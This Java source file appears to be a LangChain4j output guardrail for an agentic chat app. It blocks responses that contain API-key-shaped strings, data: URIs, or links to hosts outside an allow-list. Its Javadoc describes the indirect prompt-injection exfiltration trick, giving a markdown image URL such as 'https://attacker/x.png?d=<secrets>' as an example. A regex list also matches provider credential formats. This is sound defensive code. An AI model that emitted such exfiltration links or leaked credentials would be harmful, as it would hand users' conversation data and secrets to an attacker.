package io.github.rodrigorjsf.agenticchat.guardrail.output;

import dev.langchain4j.data.message.AiMessage;
import dev.langchain4j.guardrail.OutputGuardrail;
import dev.langchain4j.guardrail.OutputGuardrailResult;
import jakarta.inject.Singleton;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Blocks the two channels a compromised turn uses to move data out of the system.
 *
 * <p><b>Rendered links and images.</b> A markdown image whose URL embeds the
 * conversation is the classic indirect-injection payoff: the victim's client
 * fetches {@code https://attacker/x.png?d=<secrets>} the moment the answer is
 * rendered, with no click required. Since this application never has a legitimate
 * reason to emit an image or link to an arbitrary host, any URL outside the
 * allow-list is treated as exfiltration.
 *
 * <p><b>Credential-shaped strings.</b> The application's own keys should never
 * appear in a completion, and if one does the response must not reach the user
 * even once. Matching is on shape, which is the only thing available without
 * handing the guardrail the real secrets to compare against.
 *
 * <p>The allowed hosts are <b>derived from the tool catalogue</b> rather than
 * listed here — see {@link LinkAllowList}. A hand-written list beside a growing
 * catalogue drifts in the direction that hurts: a new data source is added, its
 * host is not, and the assistant starts refusing to cite the source it just used.
 *
 * <p>Both use {@code fatalWithMessageRemoval} so the offending message is dropped
 * from chat memory rather than replayed on the next turn.
 */
@Singleton
public class ExfiltrationGuardrail implements OutputGuardrail {

    private static final Logger LOG = LoggerFactory.getLogger(ExfiltrationGuardrail.class);

    /**
     * Markdown image or link: captures the destination for both forms.
     */
    private static final Pattern MARKDOWN_URL = Pattern.compile("!?\\[[^\\]]*]\\(\\s*([^)\\s]+)");
    private static final Pattern BARE_URL = Pattern.compile("\\bhttps?://([^\\s/\"'<>)\\]]+)", Pattern.CASE_INSENSITIVE);
    private static final Pattern DATA_URI = Pattern.compile("data:[^;\\s]+;base64,", Pattern.CASE_INSENSITIVE);

    /**
     * Provider key shapes. Deliberately narrow: a broad rule would eat ordinary base64.
     */
    private static final List<Pattern> SECRET_SHAPES = List.of(
            //TODO ADD GITLAB, BADROCK, ANTHROPIC
            Pattern.compile("\\bsk-[A-Za-z0-9_-]{20,}"),          // OpenAI
            Pattern.compile("\\bAIza[0-9A-Za-z_-]{35}"),           // Google
            Pattern.compile("\\bAKIA[0-9A-Z]{16}\\b"),             // AWS access key id
            Pattern.compile("\\bxox[baprs]-[0-9A-Za-z-]{10,}"),    // Slack
            Pattern.compile("\\bgh[pousr]_[0-9A-Za-z]{36}"),       // GitHub
            Pattern.compile("-----BEGIN [A-Z ]*PRIVATE KEY-----"));

    private final LinkAllowList allowList;

    public ExfiltrationGuardrail(LinkAllowList allowList) {
        this.allowList = allowList;
    }

    @Override
    public OutputGuardrailResult validate(AiMessage response) {
        if (response == null || response.text() == null || response.text().isBlank()) {
            return success();
        }
        String text = response.text();

        for (Pattern shape : SECRET_SHAPES) {
            if (shape.matcher(text).find()) {
                LOG.error("Blocked a response containing a credential-shaped string");
                return fatalWithMessageRemoval("The response was withheld by the output policy.");
            }
        }

        if (DATA_URI.matcher(text).find()) {
            LOG.warn("Blocked a response containing a data: URI");
            return fatalWithMessageRemoval("The response was withheld by the output policy.");
        }

        String offender = firstDisallowedHost(text);
        if (offender != null) {
            LOG.warn("Blocked a response linking to a host outside the allow-list: {}", offender);
            return fatalWithMessageRemoval("The response was withheld by the output policy.");
        }
        return success();
    }

    private String firstDisallowedHost(String text) {
        String fromMarkdown = scan(MARKDOWN_URL.matcher(text), true);
        if (fromMarkdown != null) {
            return fromMarkdown;
        }
        return scan(BARE_URL.matcher(text), false);
    }

    private String scan(Matcher matcher, boolean wholeUrl) {
        while (matcher.find()) {
            String candidate = matcher.group(1);
            String host = wholeUrl ? hostOf(candidate) : candidate.toLowerCase(Locale.ROOT);
            if (host == null) {
                // A relative markdown link has no host and cannot exfiltrate.
                continue;
            }
            if (!isAllowed(host)) {
                return host;
            }
        }
        return null;
    }

    private static String hostOf(String url) {
        var matcher = BARE_URL.matcher(url);
        return matcher.find() ? matcher.group(1).toLowerCase(Locale.ROOT) : null;
    }

    private boolean isAllowed(String host) {
        return allowList.allows(host);
    }
}
